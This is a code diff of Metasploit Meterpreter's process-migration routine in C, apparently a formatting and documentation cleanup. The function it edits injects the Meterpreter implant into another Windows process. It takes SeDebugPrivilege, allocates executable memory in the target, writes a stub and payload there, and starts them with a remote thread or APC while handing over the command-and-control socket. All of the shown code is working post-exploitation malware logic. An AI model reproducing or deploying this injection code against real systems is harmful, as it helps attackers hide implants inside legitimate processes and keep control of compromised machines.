@@ -62,150 +62,182 @@ typedef struct _MIGRATECONTEXT
 
 } MIGRATECONTEXT, * LPMIGRATECONTEXT;
 
-/*
- * Migrate the meterpreter server from the current process into another process.
+/*!
+ * @brief Migrate the meterpreter server from the current process into another process.
+ * @param remote Pointer to the \c Remote instance.
+ * @param packet Pointer to the request packet.
+ * @param pResult Pointer to the memory that will receive the result.
+ * @returns Indication of whether the server should continue processing or not.
  */
-BOOL remote_request_core_migrate( Remote * remote, Packet * packet, DWORD* pResult )
+BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResult)
 {
-	DWORD dwResult            = ERROR_SUCCESS;
-	Packet * response         = NULL;
-	HANDLE hToken             = NULL;
-	HANDLE hProcess           = NULL;
-	HANDLE hEvent             = NULL;
-	BYTE * lpPayloadBuffer    = NULL;
-	LPVOID lpMigrateStub      = NULL;
-	LPVOID lpMemory           = NULL;
-	MIGRATECONTEXT ctx        = {0};
+	DWORD dwResult = ERROR_SUCCESS;
+	Packet * response = NULL;
+	HANDLE hToken = NULL;
+	HANDLE hProcess = NULL;
+	HANDLE hEvent = NULL;
+	BYTE * lpPayloadBuffer = NULL;
+	LPVOID lpMigrateStub = NULL;
+	LPVOID lpMemory = NULL;
+	MIGRATECONTEXT ctx = { 0 };
 	DWORD dwMigrateStubLength = 0;
-	DWORD dwPayloadLength     = 0;
-	DWORD dwProcessID         = 0;
-	DWORD dwDestinationArch   = 0;
+	DWORD dwPayloadLength = 0;
+	DWORD dwProcessID = 0;
+	DWORD dwDestinationArch = 0;
 
 	do
 	{
-		response = packet_create_response( packet );
-		if( !response )
+		response = packet_create_response(packet);
+		if (!response)
+		{
 			break;
+		}
 
 		// Get the process identifier to inject into
-		dwProcessID = packet_get_tlv_value_uint( packet, TLV_TYPE_MIGRATE_PID );
-		
+		dwProcessID = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_PID);
+
 		// Get the target process architecture to inject into
-		dwDestinationArch = packet_get_tlv_value_uint( packet, TLV_TYPE_MIGRATE_ARCH );
+		dwDestinationArch = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_ARCH);
 
 		// Get the length of the payload buffer
-		dwPayloadLength = packet_get_tlv_value_uint( packet, TLV_TYPE_MIGRATE_LEN );
+		dwPayloadLength = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_LEN);
 
 		// Receive the actual migration payload buffer
-		lpPayloadBuffer = packet_get_tlv_value_string( packet, TLV_TYPE_MIGRATE_PAYLOAD );
-	
-		dprintf("[MIGRATE] Attempting to migrate. ProcessID=%d, Arch=%s, PayloadLength=%d", dwProcessID, ( dwDestinationArch == 2 ? "x64" : "x86" ), dwPayloadLength );
-		
-		// If we can, get SeDebugPrivilege...
-		if( OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken ) )
-		{
-			TOKEN_PRIVILEGES priv = {0};
+		lpPayloadBuffer = packet_get_tlv_value_string(packet, TLV_TYPE_MIGRATE_PAYLOAD);
 
-			priv.PrivilegeCount           = 1;
+		dprintf("[MIGRATE] Attempting to migrate. ProcessID=%d, Arch=%s, PayloadLength=%d", dwProcessID, (dwDestinationArch == 2 ? "x64" : "x86"), dwPayloadLength);
+
+		// If we can, get SeDebugPrivilege...
+		if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+		{
+			TOKEN_PRIVILEGES priv = { 0 };
+
+			priv.PrivilegeCount = 1;
 			priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-		
-			if( LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid ) )
+
+			if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
 			{
-				if( AdjustTokenPrivileges( hToken, FALSE, &priv, 0, NULL, NULL ) );
-					dprintf("[MIGRATE] Got SeDebugPrivilege!" );
+				if (AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL));
+				{
+					dprintf("[MIGRATE] Got SeDebugPrivilege!");
+				}
 			}
 
-			CloseHandle( hToken );
+			CloseHandle(hToken);
 		}
 
 		// Open the process so that we can migrate into it
-		hProcess = OpenProcess( PROCESS_DUP_HANDLE | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwProcessID );
-		if( !hProcess )
-			BREAK_ON_ERROR( "[MIGRATE] OpenProcess failed" )
+		hProcess = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwProcessID);
+		if (!hProcess)
+		{
+			BREAK_ON_ERROR("[MIGRATE] OpenProcess failed")
+		}
 
-		if ( remote->transport == METERPRETER_TRANSPORT_SSL ) {
+		if (remote->transport == METERPRETER_TRANSPORT_SSL) {
 			// Duplicate the socket for the target process if we are SSL based
-			if( WSADuplicateSocket( remote_get_fd( remote ), dwProcessID, &ctx.info ) != NO_ERROR )
-				BREAK_ON_WSAERROR( "[MIGRATE] WSADuplicateSocket failed" )
+			if (WSADuplicateSocket(remote_get_fd(remote), dwProcessID, &ctx.info) != NO_ERROR)
+			{
+				BREAK_ON_WSAERROR("[MIGRATE] WSADuplicateSocket failed")
+			}
 		}
 
 		// Create a notification event that we'll use to know when it's safe to exit 
 		// (once the socket has been referenced in the other process)
-		hEvent = CreateEvent( NULL, TRUE, FALSE, NULL );
-		if( !hEvent )
-			BREAK_ON_ERROR( "[MIGRATE] CreateEvent failed" )
+		hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
+		if (!hEvent)
+		{
+			BREAK_ON_ERROR("[MIGRATE] CreateEvent failed")
+		}
 
 		// Duplicate the event handle for the target process
-		if( !DuplicateHandle( GetCurrentProcess(), hEvent, hProcess, &ctx.e.hEvent, 0, TRUE, DUPLICATE_SAME_ACCESS ) )
-			BREAK_ON_ERROR( "[MIGRATE] DuplicateHandle failed" )
+		if (!DuplicateHandle(GetCurrentProcess(), hEvent, hProcess, &ctx.e.hEvent, 0, TRUE, DUPLICATE_SAME_ACCESS))
+		{
+			BREAK_ON_ERROR("[MIGRATE] DuplicateHandle failed")
+		}
 
 		// Get the architecture specific process migration stub...
-		if( dwDestinationArch == PROCESS_ARCH_X86 )
+		if (dwDestinationArch == PROCESS_ARCH_X86)
 		{
-			lpMigrateStub       = (LPVOID)&migrate_stub_x86;
+			lpMigrateStub = (LPVOID)&migrate_stub_x86;
 			dwMigrateStubLength = sizeof(migrate_stub_x86);
 		}
-		else if( dwDestinationArch == PROCESS_ARCH_X64 )
+		else if (dwDestinationArch == PROCESS_ARCH_X64)
 		{
-			lpMigrateStub       = (LPVOID)&migrate_stub_x64;
+			lpMigrateStub = (LPVOID)&migrate_stub_x64;
 			dwMigrateStubLength = sizeof(migrate_stub_x64);
 		}
 		else
 		{
-			SetLastError( ERROR_BAD_ENVIRONMENT );
-			BREAK_ON_ERROR( "[MIGRATE] Invalid target architecture" )
+			SetLastError(ERROR_BAD_ENVIRONMENT);
+			BREAK_ON_ERROR("[MIGRATE] Invalid target architecture")
 		}
 
 		// Allocate memory for the migrate stub, context and payload
-		lpMemory = VirtualAllocEx( hProcess, NULL, dwMigrateStubLength + sizeof(MIGRATECONTEXT) + dwPayloadLength, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
-		if( !lpMemory )
-			BREAK_ON_ERROR( "[MIGRATE] VirtualAllocEx failed" )
+		lpMemory = VirtualAllocEx(hProcess, NULL, dwMigrateStubLength + sizeof(MIGRATECONTEXT)+dwPayloadLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+		if (!lpMemory)
+		{
+			BREAK_ON_ERROR("[MIGRATE] VirtualAllocEx failed")
+		}
 
 		// Calculate the address of the payload...
-		ctx.p.lpPayload = ( (BYTE *)lpMemory + dwMigrateStubLength + sizeof(MIGRATECONTEXT) );
-		
+		ctx.p.lpPayload = ((BYTE *)lpMemory + dwMigrateStubLength + sizeof(MIGRATECONTEXT));
+
 		// Write the migrate stub to memory...
-		if( !WriteProcessMemory( hProcess, lpMemory, lpMigrateStub, dwMigrateStubLength, NULL ) )
-			BREAK_ON_ERROR( "[MIGRATE] WriteProcessMemory 1 failed" )
+		if (!WriteProcessMemory(hProcess, lpMemory, lpMigrateStub, dwMigrateStubLength, NULL))
+		{
+			BREAK_ON_ERROR("[MIGRATE] WriteProcessMemory 1 failed")
+		}
 
 		// Write the migrate context to memory...
-		if( !WriteProcessMemory( hProcess, ( (BYTE *)lpMemory + dwMigrateStubLength ), &ctx, sizeof(MIGRATECONTEXT), NULL ) )
-			BREAK_ON_ERROR( "[MIGRATE] WriteProcessMemory 2 failed" )
+		if (!WriteProcessMemory(hProcess, ((BYTE *)lpMemory + dwMigrateStubLength), &ctx, sizeof(MIGRATECONTEXT), NULL))
+		{
+			BREAK_ON_ERROR("[MIGRATE] WriteProcessMemory 2 failed")
+		}
 
 		// Write the migrate payload to memory...
-		if( !WriteProcessMemory( hProcess, ctx.p.lpPayload, lpPayloadBuffer, dwPayloadLength, NULL ) )
-			BREAK_ON_ERROR( "[MIGRATE] WriteProcessMemory 3 failed" )
+		if (!WriteProcessMemory(hProcess, ctx.p.lpPayload, lpPayloadBuffer, dwPayloadLength, NULL))
+		{
+			BREAK_ON_ERROR("[MIGRATE] WriteProcessMemory 3 failed")
+		}
 
 		// First we try to migrate by directly creating a remote thread in the target process
-		if( inject_via_remotethread( remote, response, hProcess, dwDestinationArch, lpMemory, ((BYTE*)lpMemory+dwMigrateStubLength) ) != ERROR_SUCCESS )
+		if (inject_via_remotethread(remote, response, hProcess, dwDestinationArch, lpMemory, ((BYTE*)lpMemory + dwMigrateStubLength)) != ERROR_SUCCESS)
 		{
-			dprintf( "[MIGRATE] inject_via_remotethread failed, trying inject_via_apcthread..." );
-			
+			dprintf("[MIGRATE] inject_via_remotethread failed, trying inject_via_apcthread...");
+
 			// If that fails we can try to migrate via a queued APC in the target process
-			if( inject_via_apcthread( remote, response, hProcess, dwProcessID, dwDestinationArch, lpMemory, ((BYTE*)lpMemory+dwMigrateStubLength) ) != ERROR_SUCCESS )
-				BREAK_ON_ERROR( "[MIGRATE] inject_via_apcthread failed" )
+			if (inject_via_apcthread(remote, response, hProcess, dwProcessID, dwDestinationArch, lpMemory, ((BYTE*)lpMemory + dwMigrateStubLength)) != ERROR_SUCCESS)
+			{
+				BREAK_ON_ERROR("[MIGRATE] inject_via_apcthread failed")
+			}
 		}
 
 		dwResult = ERROR_SUCCESS;
 
-	} while( 0 );
+	} while (0);
 
 	// If we failed and have not sent the response, do so now
-	if( dwResult != ERROR_SUCCESS && response )
-		packet_transmit_response( dwResult, remote, response );
+	if (dwResult != ERROR_SUCCESS && response)
+	{
+		packet_transmit_response(dwResult, remote, response);
+	}
 
 	// Cleanup...
-	if( hProcess )
-		CloseHandle( hProcess );
+	if (hProcess)
+	{
+		CloseHandle(hProcess);
+	}
 
-	if( hEvent )
-		CloseHandle( hEvent );
+	if (hEvent)
+	{
+		CloseHandle(hEvent);
+	}
 
-	if( pResult )
+	if (pResult)
+	{
 		*pResult = dwResult;
+	}
 
 	// if migration succeeded, return 'FALSE' to indicate server thread termination.
-	return dwResult = ERROR_SUCCESS ? FALSE : TRUE;
+	return ERROR_SUCCESS == dwResult ? FALSE : TRUE;
 }
-
-
